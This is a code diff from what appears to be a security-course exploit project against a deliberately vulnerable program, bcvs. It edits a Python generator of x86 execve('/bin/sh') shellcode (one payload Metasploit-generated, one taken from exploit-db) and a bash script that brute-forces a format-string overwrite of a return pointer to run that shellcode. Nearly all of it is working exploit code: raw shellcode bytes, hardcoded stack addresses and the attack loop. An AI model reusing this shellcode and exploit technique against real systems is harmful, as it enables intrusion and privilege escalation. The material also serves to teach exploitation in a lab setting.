@@ -25,25 +25,36 @@ import sys
 bsize = 240
 NOP="\x90"
 
-shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-shellcode += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-shellcode += "\x80\xe8\xdc\xff\xff\xff/bin/sh"
+shellcode1 = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+shellcode1 += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+shellcode1 += "\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
-shellcode2 = "\x6A\x68\x68\x2F\x62\x61\x73\x68\x2F\x62\x69\x6E\x89\xE3\x31\xD2"
-shellcode2 += "\x52\x53\x89\xE1\x6A\x0B\x58\xCD\x80"
+# Generated using the metasploit payload generator to not have these bytes
+# \x00 \xFF \x0A
+# Because of these byte exceptions the payload is kind of large (70 bytes)
+shellcode2 = "\xd9\xf7\xbd\xde\x7e\xdf\xcf\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
+shellcode2 += "\x0b\x83\xc0\x04\x31\x68\x16\x03\x68\x16\xe2\x2b\x14\xd4\x97"
+shellcode2 += "\x4a\xbb\x8c\x4f\x41\x5f\xd8\x77\xf1\xb0\xa9\x1f\x01\xa7\x62"
+shellcode2 += "\x82\x68\x59\xf4\xa1\x38\x4d\x0e\x26\xbc\x8d\x20\x44\xd5\xe3"
+shellcode2 += "\x11\xfb\x4d\xfc\x3a\xa8\x04\x1d\x09\xce"
 
-shellcode3 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
-shellcode3 += "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
-
-shellcode4 = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
-shellcode4 += "\x6e\x89\xe3\x31\xc9\xcd\x80"
-
+# Source http://www.exploit-db.com/exploits/13357/
+# This shell re-opens the stdin fd. Cross your fingers that this will fix
+# our problems...yay it worked. If only I had figured this out 5 days
+# earlier...
+shellcode3 = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
+shellcode3 += "\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
+shellcode3 += "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
 
 if __name__ == '__main__':
   if len(sys.argv) > 1:
     bsize = int(sys.argv[1])
+
+  shellcode = None
   if len(sys.argv) > 2:
     shellcode = eval("shellcode" + sys.argv[2])
+  else:
+    shellcode = shellcode1
 
   if bsize < len(shellcode):
     print("Your buffer size should be at least as long as the shellcode: {}".format(len(shellcode)))
@@ -291,18 +302,19 @@ if [[ $# -gt 0 && $1 == "-s" ]]; then
   exit 0
 fi
 
-SHELLCODE=`./payload.py 300 4`
+SHELLCODE=`./payload.py 300 2`
 
 if [[ $? == -1 ]]; then
   echo "failed to generate shellcode"
   exit -1
 fi
 echo "Created shellcode of length: ${#SHELLCODE}"
+echo "Shellcode: ${SHELLCODE}"
 
 touch temp_file
 
 OFFSET=0
-RET_PTR_LOC="bffff57C"  # The frame for writeLog shouldn't come before this
+RET_PTR_LOC="bffff54C"  # The frame for writeLog shouldn't come before this
 ATTACK_JMP_ADDR="804C328"
 
 # Now that we store the address part of the format string on the stack in main
@@ -314,10 +326,10 @@ echo "Format address length: $FORMAT_ADDRS_LEN"
 
 # Now we brute force it. Hopefully if our initial guess isn't too far off we
 # should get it soon.
-while [[ $OFFSET -lt 25 ]]; do
+while [[ $OFFSET -lt 1 ]]; do
   _OFFSET=$(( $OFFSET * 16 ))
-  PRINTF_OFFSET=-2
-  while [[ $PRINTF_OFFSET -lt 4 ]]; do
+  PRINTF_OFFSET=0
+  while [[ $PRINTF_OFFSET -lt 1 ]]; do
     echo "Generating format string [base,rptr_offset,printf_offset]: [$RET_PTR_LOC,$_OFFSET,$PRINTF_OFFSET]"
     FORMAT_STR=`./gen_fmt_str.py $RET_PTR_LOC $ATTACK_JMP_ADDR $_OFFSET $PRINTF_OFFSET 1`
     FORMAT_ADDRS=${FORMAT_STR:0:$FORMAT_ADDRS_LEN}  # These addresses will go into log (in main)
@@ -334,7 +346,9 @@ while [[ $OFFSET -lt 25 ]]; do
     echo "Format String Addrs: ${FORMAT_ADDRS}"
     echo "Format Directives: ${FORMAT_DIRS}"
 
-    echo "${FORMAT_DIRS}${SHELLCODE}" | /opt/bcvs/bcvs ci "$FORMAT_ADDRS"
+    echo -n "${FORMAT_DIRS}${SHELLCODE}" > "heap_attack_data"
+
+    /opt/bcvs/bcvs ci "$FORMAT_ADDRS" < "heap_attack_data"
 
     PRINTF_OFFSET=$(( $PRINTF_OFFSET + 1 ))
   done
